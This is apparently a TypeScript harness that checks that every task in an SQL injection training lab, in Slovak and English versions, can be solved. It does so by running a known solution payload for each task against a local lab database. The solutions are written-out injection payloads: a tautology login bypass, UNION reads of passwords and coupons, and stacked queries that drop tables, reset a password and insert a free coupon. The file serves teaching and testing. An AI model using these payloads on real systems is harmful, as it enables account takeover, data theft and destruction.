/**
 * Solvability harness for the built-in task sets.
 *
 *   npm run verify:tasks
 *
 * For every task in every built-in set, this runs a known solution payload
 * through the SAME validation path the browser uses (substitute + checkSolved
 * from lib/sql/engine.ts, on a fresh DB instance per task, exactly like
 * runTask), and asserts the task is marked solved. It catches the answer/data
 * mismatches this translation is most likely to introduce, and proves the
 * Slovak set still passes after the prose edits.
 *
 * If you add or renumber a task, add its solution here.
 */
import fs from 'node:fs';
import path from 'node:path';
import initSqlJs from 'sql.js';
import { substitute, checkSolved } from '@/lib/sql/engine';
import { taskListSchema, type TaskDef } from '@/lib/schemas/task-set';

const ROOT = process.cwd();
const WASM = path.join(ROOT, 'public/sql-wasm.wasm');

/** Per-language literals that appear inside solution payloads. */
type Vocab = {
  productName: string; // task 9 target product
  newPassword: string; // task 8 new password for jan123
  newCoupon: string; // task 12 new coupon code
  newUser: string; // task 13 new username
  newUserPassword: string; // task 13 new password
};

type Suite = {
  slug: string;
  tasksFile: string;
  dbFile: string;
  vocab: Vocab;
};

const SUITES: Suite[] = [
  {
    slug: 'builtin-sk',
    tasksFile: 'lib/seed/builtin-tasks.json',
    dbFile: 'public/db/SQLInjectionLab.db',
    vocab: {
      productName: 'Smartfón Samsung Galaxy S20',
      newPassword: 'sihacknuty',
      newCoupon: 'UPLNAZLAVA',
      newUser: 'Juraj',
      newUserPassword: 'silneheslo',
    },
  },
  {
    slug: 'builtin-en',
    tasksFile: 'lib/seed/builtin-tasks.en.json',
    dbFile: 'public/db/SQLInjectionLab.en.db',
    vocab: {
      productName: 'Samsung Galaxy S20 Smartphone',
      newPassword: 'youarehacked',
      newCoupon: 'FULLDISCOUNT',
      newUser: 'George',
      newUserPassword: 'strongpassword',
    },
  },
];

/** taskId → the inputs that solve it, given a language's vocab. */
function solutions(v: Vocab): Record<string, Record<string, string>> {
  return {
    // Piggy-backed DROP of the users table.
    '1': { name: "'; DROP TABLE users; --", password: '' },
    // Piggy-backed listing of all table names.
    '2': {
      search: "'; SELECT name FROM sqlite_master WHERE type='table'; --",
    },
    // UNION to read user passwords.
    '3': { search: "' UNION SELECT password FROM users --" },
    // UNION to surface every coupon code (query returns two columns).
    '4': { search: "' UNION SELECT coupon_code, coupon_code FROM coupons --" },
    // Error-based: a UNION with the wrong column count throws.
    '5': { search: "' UNION SELECT 1,2 --" },
    // Tautology to satisfy the login check.
    '6': { name: "' OR '1'='1", password: "' OR '1'='1" },
    // Tautology to return every shipment.
    '7': { tracking_number: "' OR '1'='1" },
    // Piggy-backed UPDATE of jan123's password.
    '8': {
      name: `'; UPDATE users SET password='${v.newPassword}' WHERE username='jan123'; --`,
      password: '',
    },
    // Piggy-backed UPDATE of the product price to 0.
    '9': {
      search: `'; UPDATE products SET price=0 WHERE product_name='${v.productName}'; --`,
    },
    // UNION to reveal that a view exists.
    '10': {
      coupon: "' UNION SELECT name FROM sqlite_master WHERE type='view' --",
    },
    // Piggy-backed DROP of the view (numeric input, exploited anyway).
    '11': { product: "'; DROP VIEW user_orders; --" },
    // Piggy-backed INSERT of a 100%-off coupon.
    '12': {
      coupon: `'; INSERT INTO coupons (coupon_code, discount_amount, expiry_date) VALUES ('${v.newCoupon}', 100, '2030-01-01'); --`,
    },
    // Piggy-backed INSERT of a new user (all NOT NULL columns supplied).
    '13': {
      name: `'; INSERT INTO users (username, email, password, full_name, address) VALUES ('${v.newUser}', '${v.newUser.toLowerCase()}@example.com', '${v.newUserPassword}', '${v.newUser}', 'Somewhere'); --`,
      password: '',
    },
  };
}

async function main() {
  const SQL = await initSqlJs({ locateFile: () => WASM });
  let failures = 0;

  for (const suite of SUITES) {
    const tasks: TaskDef[] = taskListSchema.parse(
      JSON.parse(fs.readFileSync(path.join(ROOT, suite.tasksFile), 'utf8'))
    );
    const dbBytes = fs.readFileSync(path.join(ROOT, suite.dbFile));
    const sol = solutions(suite.vocab);

    console.log(`\n${suite.slug} (${suite.dbFile})`);

    for (const task of tasks) {
      const inputs = sol[task.id];
      if (!inputs) {
        console.error(`  ✗ task ${task.id}: no solution defined`);
        failures++;
        continue;
      }

      // Mirror runTask: a fresh DB instance from a copy of the bytes, run the
      // main query, then evaluate with checkSolved on the same instance.
      const db = new SQL.Database(new Uint8Array(dbBytes));
      let results: initSqlJs.QueryExecResult[] = [];
      let errored = false;
      try {
        results = db.exec(substitute(task.query, inputs));
      } catch {
        errored = true;
      }
      const solved = checkSolved(db, task, inputs, results, errored);
      db.close();

      if (solved) {
        console.log(`  ✓ task ${task.id}: ${task.caption}`);
      } else {
        console.error(`  ✗ task ${task.id}: NOT solved — ${task.caption}`);
        failures++;
      }
    }
  }

  if (failures > 0) {
    console.error(`\n${failures} task(s) failed to solve.`);
    process.exit(1);
  }
  console.log('\nAll tasks solvable in every built-in set. ✓');
}

main().catch((err) => {
  console.error('Verification failed:', err);
  process.exit(1);
});
